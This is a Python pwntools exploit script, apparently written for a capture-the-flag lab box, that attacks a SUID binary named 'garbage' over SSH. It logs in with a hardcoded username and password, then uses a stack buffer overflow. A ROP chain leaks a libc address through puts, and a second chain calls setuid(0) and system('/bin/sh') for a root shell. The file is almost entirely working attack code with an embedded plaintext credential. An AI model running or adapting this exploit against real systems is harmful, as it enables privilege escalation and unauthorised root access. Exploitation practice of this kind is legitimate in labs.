#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template garbage
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('garbage')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

shell = ssh('margo', '10.10.10.139', password='iamgod$08', port=22)
p = shell.run('/usr/bin/garbage')


plt_main = p64(0x401619)
plt_put = p64(0x401050)
got_put = p64(0x404028)
pop_rdi = p64(0x40179b)
overflow = 'A' * 136

payload = overflow + pop_rdi + got_put + plt_put + plt_main

p.sendline(payload)
p.recvuntil("access denied.\n")
leaked_puts = p.recvline()[:8].strip().ljust(8, "\x00")
log.success("Leaked puts@GLIBCL: {}".format(leaked_puts))

leaked_puts = u64(leaked_puts)

# local libc
# libc_put = 0x071b80
# libc_setuid = 0x0c7840
# libc_sys = 0x044c50
# libc_sh = 0x181519

# box libc
libc_put = 0x0809c0
libc_setuid = 0x0e5970
libc_sys = 0x04f440
libc_sh = 0x1b3e9a

# Stage 2: Call setuid(0); system("bin/sh")
offset = leaked_puts - libc_put
zero = p64(0)
setuid = p64(offset + libc_setuid)
sh = p64(offset + libc_sh)
sys = p64(offset + libc_sys)

payload = overflow + pop_rdi + zero + setuid + pop_rdi + sh + sys
p.sendline(payload)
p.recvuntil("access denied.\n")

# raw_input()
p.interactive()
